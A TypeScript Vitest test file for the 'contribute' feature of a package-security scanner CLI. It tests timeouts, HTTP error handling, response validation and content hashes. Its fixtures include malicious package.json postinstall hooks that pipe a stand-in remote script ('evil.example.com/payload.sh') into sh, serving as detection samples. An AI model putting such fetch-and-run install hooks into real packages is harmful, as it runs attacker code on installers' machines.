import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
    runContribute,
    computeContentId,
    computeManifestHash,
    analyzeManifest,
    toAlert,
} from './contribute';
import { saveSession, fetchContribute, validateContributeResult } from './cloud_client';
import type { Session, ContributePayload } from './cloud_client';

function buildSession(token: string, overrides: Partial<Session> = {}): Session {
    return {
        token,
        user: 'octocat',
        subjectId: 'sub_123',
        plan: 'pro',
        planLabel: 'Pro',
        expiresAt: '2027-08-05T00:00:00.000Z',
        capabilities: {
            content_intel_lookup: true,
            remote_scan: true,
            oracle_integration: true,
            offline_sync: false,
            sbom: true,
            ai_review: false,
            contribute: true,
        },
        limits: { apiRequestsPerMonth: 10000, maxRepos: 25, retentionDays: 365 },
        fetchedAt: '2026-08-05T00:00:00.000Z',
        ...overrides,
    };
}

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-contribute-sec-'));
}

function outputText(result: { lines: { text: string }[] }): string {
    return result.lines.map((l) => l.text).join('\n');
}

function writeManifest(dir: string): string {
    fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: 'evil-pkg', version: '1.0.0', scripts: { postinstall: 'curl evil.sh | sh' } }),
        'utf8'
    );
    return path.join(dir, 'package.json');
}

function contributeBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
    return {
        applied: true,
        contentId: `sha512:${'a'.repeat(128)}`,
        state: 'MALICIOUS',
        previousState: 'UNKNOWN',
        reason: null,
        scannerVersion: 'sentinel-cli-4.0.0',
        verified: false,
        ...overrides,
    };
}

function buildPayload(overrides: Partial<ContributePayload> = {}): ContributePayload {
    const manifest = JSON.stringify({
        name: 'evil-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
    });
    const alerts = analyzeManifest(manifest).map(toAlert);
    return {
        manifest,
        contentId: computeContentId(Buffer.from(manifest, 'utf8')),
        state: 'MALICIOUS',
        scannerVersion: 'sentinel-cli-4.0.0',
        evidence: {
            risk: 'critical',
            manifestHash: computeManifestHash(alerts),
            alerts,
            deltas: [],
        },
        ...overrides,
    };
}

function mockResponse(
    fetchMock: ReturnType<typeof vi.fn>,
    status: number,
    body: unknown,
    headers: Record<string, string> = {}
): void {
    const normalized: Record<string, string> = {};
    for (const [name, value] of Object.entries(headers)) {
        normalized[name.toLowerCase()] = value;
    }
    fetchMock.mockResolvedValue({
        ok: status >= 200 && status < 300,
        status,
        headers: {
            get: (name: string) => normalized[name.toLowerCase()] ?? null,
        },
        json: () => Promise.resolve(body),
    });
}

describe('fetchContribute timeout (adversarial never-resolving server)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('aborts a request that never responds, falls back to local analysis, and preserves the session', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            let capturedSignal: AbortSignal | undefined;
            fetchMock.mockImplementation((_url: string, init?: RequestInit) => {
                capturedSignal = init?.signal;
                return new Promise<Response>((_resolve, reject) => {
                    init?.signal?.addEventListener('abort', () => {
                        reject(new DOMException('The operation was aborted.', 'AbortError'));
                    });
                });
            });

            const started = Date.now();
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com', timeoutMs: 20 },
                { sessionDir: dir }
            );
            const elapsed = Date.now() - started;

            expect(elapsed).toBeLessThan(2000);
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud unavailable — continuing with local analysis.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
            expect(capturedSignal?.aborted).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('cloud_client contribute contract (static source guards)', () => {
    it('maps 401, 403, 429, 503, 400/413 to their kinds BEFORE the generic non-ok branch', () => {
        const src = fs.readFileSync(path.join(__dirname, 'cloud_client.ts'), 'utf8');
        const contributeStart = src.indexOf('export async function fetchContribute');
        const contributeBlock = src.slice(contributeStart);
        const authIdx = contributeBlock.indexOf('res.status === 401');
        const forbiddenIdx = contributeBlock.indexOf('res.status === 403');
        const quotaIdx = contributeBlock.indexOf('res.status === 429');
        const disabledIdx = contributeBlock.indexOf('res.status === 503');
        const badRequestIdx = contributeBlock.indexOf('res.status === 400 || res.status === 413');
        const genericIdx = contributeBlock.indexOf('if (!res.ok)');
        expect(authIdx).toBeGreaterThan(-1);
        expect(forbiddenIdx).toBeGreaterThan(authIdx);
        expect(quotaIdx).toBeGreaterThan(forbiddenIdx);
        expect(disabledIdx).toBeGreaterThan(quotaIdx);
        expect(badRequestIdx).toBeGreaterThan(disabledIdx);
        expect(genericIdx).toBeGreaterThan(badRequestIdx);
    });

    it('POSTs to /api/intelligence/contribute with a 20s AbortController timeout and passes the abort signal to fetch', () => {
        const src = fs.readFileSync(path.join(__dirname, 'cloud_client.ts'), 'utf8');
        const contributeStart = src.indexOf('export async function fetchContribute');
        const contributeBlock = src.slice(contributeStart);
        expect(src).toContain('const CONTRIBUTE_TIMEOUT_MS = 20000;');
        expect(contributeBlock).toContain("'/api/intelligence/contribute'");
        expect(contributeBlock).toContain('new AbortController()');
        expect(contributeBlock).toMatch(/setTimeout\(\(\) => controller\.abort\(\), timeoutMs\)/);
        expect(contributeBlock).toContain('signal: controller.signal');
        expect(contributeBlock).toContain('body: JSON.stringify(payload)');
    });

    it('validateContributeResult enforces contentId format, state enum, reason null-or-string and verified === false', () => {
        expect(validateContributeResult(contributeBody())).not.toBeNull();
        expect(validateContributeResult(contributeBody({ contentId: 'sha512:zz' }))).toBeNull();
        expect(validateContributeResult(contributeBody({ state: 'WEIRD' }))).toBeNull();
        expect(validateContributeResult(contributeBody({ reason: 5 }))).toBeNull();
        expect(validateContributeResult(contributeBody({ verified: true }))).toBeNull();
        expect(validateContributeResult(contributeBody({ applied: 'yes' }))).toBeNull();
    });

    it('validateContributeResult also enforces previousState and scannerVersion per the contract response', () => {
        expect(validateContributeResult(contributeBody({ previousState: null }))).not.toBeNull();
        expect(validateContributeResult(contributeBody({ previousState: 'UNKNOWN' }))).not.toBeNull();
        expect(validateContributeResult(contributeBody({ previousState: undefined }))).toBeNull();
        expect(validateContributeResult(contributeBody({ previousState: 5 }))).toBeNull();
        expect(validateContributeResult(contributeBody({ scannerVersion: undefined }))).toBeNull();
        expect(validateContributeResult(contributeBody({ scannerVersion: '' }))).toBeNull();
    });
});

describe('cloud_client fetchContribute', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('parses an accepted contribution and POSTs to /api/intelligence/contribute with the Bearer token', async () => {
        mockResponse(fetchMock, 200, contributeBody());
        const result = await fetchContribute(
            buildPayload(),
            'tok-1',
            'https://cloud.example.com'
        );
        expect(result.ok).toBe(true);
        if (result.ok) {
            expect(result.data.applied).toBe(true);
            expect(result.data.state).toBe('MALICIOUS');
            expect(result.data.verified).toBe(false);
        }
        const [url, init] = fetchMock.mock.calls[0];
        expect(url).toBe('https://cloud.example.com/api/intelligence/contribute');
        const headers = (init as { headers: Record<string, string> }).headers;
        expect(headers.Authorization).toBe('Bearer tok-1');
        expect(headers['Content-Type']).toBe('application/json');
        const sentBody = JSON.parse((init as { body: string }).body);
        expect(sentBody.state).toBe('MALICIOUS');
        expect(sentBody.contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
        expect(sentBody.evidence.manifestHash).toMatch(/^[0-9a-f]{24}$/);
    });

    it('maps 401 to kind auth', async () => {
        mockResponse(fetchMock, 401, { error: 'Invalid or expired API token.' });
        const result = await fetchContribute(buildPayload(), 'bad', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('auth');
            expect(result.status).toBe(401);
        }
    });

    it('maps 403 to kind forbidden', async () => {
        mockResponse(fetchMock, 403, { error: 'Your plan does not include intelligence contribution.' });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('forbidden');
            expect(result.error).toContain('intelligence contribution');
        }
    });

    it('maps 429 to kind quota, surfaces the server error and captures Retry-After', async () => {
        mockResponse(fetchMock, 429, { error: 'Monthly API quota exhausted.' }, { 'Retry-After': '120' });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('quota');
            expect(result.status).toBe(429);
            expect(result.error).toBe('Monthly API quota exhausted.');
            expect(result.retryAfterSeconds).toBe(120);
        }
    });

    it('ignores a malformed negative Retry-After instead of surfacing "Retry in -Ns."', async () => {
        mockResponse(fetchMock, 429, { error: 'Rate limited.' }, { 'Retry-After': '-5' });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('quota');
            expect(result.retryAfterSeconds).toBeUndefined();
        }
    });

    it('ignores a non-numeric Retry-After (RFC 7231 HTTP-date) without crashing', async () => {
        mockResponse(
            fetchMock,
            429,
            { error: 'Rate limited.' },
            { 'Retry-After': 'Wed, 21 Oct 2026 07:28:00 GMT' }
        );
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('quota');
            expect(result.retryAfterSeconds).toBeUndefined();
        }
    });

    it('maps 503 to kind disabled', async () => {
        mockResponse(fetchMock, 503, { error: 'Content-intel is disabled on this server.' });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('disabled');
            expect(result.error).toContain('disabled');
        }
    });

    it('maps 400 and 413 to kind bad_request with the server error', async () => {
        mockResponse(fetchMock, 413, { error: 'Contribution rejected: manifest too large.' });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('bad_request');
            expect(result.error).toContain('manifest too large');
        }
    });

    it('rejects a 200 body that fails structural validation as kind network', async () => {
        mockResponse(fetchMock, 200, { applied: true });
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('rejects a 200 body where verified is true as kind network', async () => {
        mockResponse(fetchMock, 200, contributeBody({ verified: true }));
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('rejects a 200 body with an invalid contentId as kind network', async () => {
        mockResponse(fetchMock, 200, contributeBody({ contentId: 'sha512:nothex' }));
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('maps network failure to kind network without throwing', async () => {
        fetchMock.mockRejectedValue(new Error('fetch failed: ECONNREFUSED'));
        const result = await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('strips trailing slashes from the base URL', async () => {
        mockResponse(fetchMock, 200, contributeBody());
        await fetchContribute(buildPayload(), 'tok-1', 'https://cloud.example.com///');
        expect(fetchMock.mock.calls[0][0]).toBe(
            'https://cloud.example.com/api/intelligence/contribute'
        );
    });
});

describe('contribute hash formats', () => {
    it('computeContentId returns sha512:<128 lowercase hex> of the manifest bytes', () => {
        const manifest = '{"name":"pkg","version":"1.0.0"}';
        const contentId = computeContentId(Buffer.from(manifest, 'utf8'));
        expect(contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
        expect(contentId).toBe('sha512:' + require('crypto').createHash('sha512').update(manifest).digest('hex'));
    });

    it('computeManifestHash returns the first 24 hex chars of sha256 over the exact alerts payload', () => {
        const manifest = '{"name":"pkg","version":"1.0.0"}';
        const alerts = analyzeManifest(manifest).map(toAlert);
        const hash = computeManifestHash(alerts);
        expect(hash).toMatch(/^[0-9a-f]{24}$/);
        const expected = require('crypto')
            .createHash('sha256')
            .update(JSON.stringify({ alerts, deltas: [] }))
            .digest('hex')
            .slice(0, 24);
        expect(hash).toBe(expected);
    });
});
